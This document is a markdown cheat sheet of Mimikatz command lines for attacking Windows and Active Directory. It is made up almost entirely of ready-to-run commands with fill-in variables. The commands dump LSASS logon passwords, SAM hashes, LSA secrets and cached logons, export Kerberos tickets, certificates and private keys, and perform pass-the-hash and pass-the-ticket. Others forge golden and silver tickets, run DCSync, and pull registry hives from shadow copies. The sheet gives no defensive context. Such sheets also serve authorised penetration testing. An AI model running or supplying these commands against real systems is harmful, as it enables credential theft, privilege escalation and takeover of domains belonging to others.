# Mimikatz

## mimikatz

### Logon passwords

Dump logon passwords with Mimikatz.

```sh title:"Mimikatz Dump Logon Passwords"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
<!-- cheat -->

### Logon passwords and SAM

Dump logon passwords and SAM with Mimikatz.

```sh title:"Mimikatz Dump Logon Passwords and SAM"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit
```
<!-- cheat -->

### Export tickets from LSASS

Run export tickets from LSASS with Mimikatz.

```sh title:"Mimikatz Run Export Tickets from LSASS"
mimikatz.exe "sekurlsa::tickets /export" exit
```
<!-- cheat -->

### Pass-the-hash

Dump pass the hash with Mimikatz.

```sh title:"Mimikatz Dump Pass the Hash"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:cmd" exit
```
<!-- cheat
var user
var domain
var hash
-->

### List and export tickets

List and export tickets with Mimikatz.

```sh title:"Mimikatz List and Export Tickets"
mimikatz.exe "kerberos::list /export" exit
```
<!-- cheat -->

### Pass-the-ticket

Run pass the ticket with Mimikatz.

```sh title:"Mimikatz Run Pass the Ticket"
mimikatz.exe "kerberos::ptt c:\$ticket_file.kirbi" exit
```
<!-- cheat
var ticket_file
-->

### Forge golden ticket

Run forge golden ticket with Mimikatz.

```sh title:"Mimikatz Run Forge Golden Ticket"
mimikatz.exe "kerberos::golden /admin:$target_user /domain:$domain /sid:$domain_sid /krbtgt:$krbtgt_hash /ticket:$ticket_file.kirbi" exit
```
<!-- cheat
var target_user
var domain
var domain_sid
var krbtgt_hash
var ticket_file
-->

### CAPI certificates

Read CAPI certificates with Mimikatz.

```sh title:"Mimikatz Read CAPI Certificates"
mimikatz.exe "crypto::capi" exit
```
<!-- cheat -->

### CNG certificates

Read CNG certificates with Mimikatz.

```sh title:"Mimikatz Read CNG Certificates"
mimikatz.exe "crypto::cng" exit
```
<!-- cheat -->

### Export user certs

Run export user certs with Mimikatz.

```sh title:"Mimikatz Run Export User Certs"
mimikatz.exe "crypto::certificates /export" exit
```
<!-- cheat -->

### Export machine certs

Start export machine certs with Mimikatz.

```sh title:"Mimikatz Start Export Machine Certs"
mimikatz.exe "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" exit
```
<!-- cheat -->

### Export keys

Run export keys with Mimikatz.

```sh title:"Mimikatz Run Export Keys"
mimikatz.exe "crypto::keys /export" exit
```
<!-- cheat -->

### Export machine keys

Run export machine keys with Mimikatz.

```sh title:"Mimikatz Run Export Machine Keys"
mimikatz.exe "crypto::keys /machine /export" exit
```
<!-- cheat -->

### Vault credentials

Dump vault credentials with Mimikatz.

```sh title:"Mimikatz Dump Vault Credentials"
mimikatz.exe "vault::cred" exit
```
<!-- cheat -->

### Vault list

List vault list with Mimikatz.

```sh title:"Mimikatz List Vault List"
mimikatz.exe "vault::list" exit
```
<!-- cheat -->

### Elevate to SYSTEM

Dump elevate to SYSTEM with Mimikatz.

```sh title:"Mimikatz Dump Elevate to SYSTEM"
mimikatz.exe "token::elevate" exit
```
<!-- cheat -->

### Dump SAM hashes

Dump SAM hashes with Mimikatz.

```sh title:"Mimikatz Dump SAM Hashes"
mimikatz.exe "lsadump::sam" exit
```
<!-- cheat -->

### SAM from copied hives

Dump SAM from copied hives with Mimikatz.

```cmd title:"Mimikatz Dump SAM from Copied Hives"
mimikatz.exe "lsadump::sam /system:$system_hive /sam:$sam_hive" exit
```
<!-- cheat
var system_hive
var sam_hive
-->

### LSASS minidump

Read LSASS minidump with Mimikatz.

```sh title:"Mimikatz Read LSASS Minidump"
mimikatz.exe "privilege::debug" "sekurlsa::minidump $lsass_dump" "sekurlsa::logonpasswords" exit
```
<!-- cheat
var lsass_dump
-->

### Dump LSA secrets

Dump LSA secrets with Mimikatz.

```sh title:"Mimikatz Dump LSA Secrets"
mimikatz.exe "lsadump::secrets" exit
```
<!-- cheat -->

### Dump cached logons

Dump cached logons with Mimikatz.

```sh title:"Mimikatz Dump Cached Logons"
mimikatz.exe "lsadump::cache" exit
```
<!-- cheat -->

### Revert token

Run revert token with Mimikatz.

```sh title:"Mimikatz Run Revert Token"
mimikatz.exe "token::revert" exit
```
<!-- cheat -->

### DCSync krbtgt

Read DCSync krbtgt with Mimikatz.

```sh title:"Mimikatz Read DCSync Krbtgt"
mimikatz.exe "lsadump::dcsync /domain:$domain /user:$domain\administrator" exit
```
<!-- cheat
var domain
-->

### DCSync user

Run DCSync user with Mimikatz.

```sh title:"Mimikatz Run DCSync User"
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$domain /user:$target_user" exit
```
<!-- cheat
var domain
var target_user
-->

### Golden ticket pass-the-ticket

Run golden ticket pass the ticket with Mimikatz.

```sh title:"Mimikatz Run Golden Ticket Pass the Ticket"
mimikatz.exe "kerberos::golden /domain:$domain /user:Administrator /sid:$domain_sid /rc4:$rc4_hash /ptt" exit
```
<!-- cheat
var domain
var domain_sid
var rc4_hash
-->

### Golden ticket extra SID

Run golden ticket extra SID with Mimikatz.

```sh title:"Mimikatz Run Golden Ticket Extra SID"
mimikatz.exe "kerberos::golden /user:$user /domain:$domain /sid:$child_sid /krbtgt:$krbtgt_hash /sids:$parent_sid-519 /ptt" exit
```
<!-- cheat
var user
var domain
var child_sid
var krbtgt_hash
var parent_sid
-->

### Pass-the-hash RDP

Dump pass the hash RDP with Mimikatz.

```sh title:"Mimikatz Dump Pass the Hash RDP"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:\"mstsc.exe /restrictedadmin\"" exit
```
<!-- cheat
var user
var domain
var hash
-->

### Pass-the-hash PowerShell

Dump pass the hash PowerShell with Mimikatz.

```sh title:"Mimikatz Dump Pass the Hash PowerShell"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:powershell" exit
```
<!-- cheat
var user
var domain
var hash
-->

## Shadow copies

### SAM from shadow copy

Dump SAM from shadow copy with Mimikatz.

```sh title:"Mimikatz Dump SAM from Shadow Copy"
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" exit
```
<!-- cheat -->

### LSA secrets from shadow copy

Dump LSA secrets from shadow copy with Mimikatz.

```sh title:"Mimikatz Dump LSA Secrets from Shadow Copy"
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" exit
```
<!-- cheat -->

### Copy shadow hives

Copy shadow hives with Mimikatz.

```powershell title:"Mimikatz Copy Shadow Hives"
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.hiv')"
```
<!-- cheat -->

### Forge silver ticket

Run forge silver ticket with Mimikatz.

```sh title:"Mimikatz Run Forge Silver Ticket"
mimikatz.exe "kerberos::golden /domain:$domain /user:Administrator /sid:$domain_sid /rc4:$rc4_hash /target:$target /service:cifs /ticket:$ticket_file.kirbi" exit
```
<!-- cheat
var domain
var domain_sid
var rc4_hash
var target
var ticket_file
-->
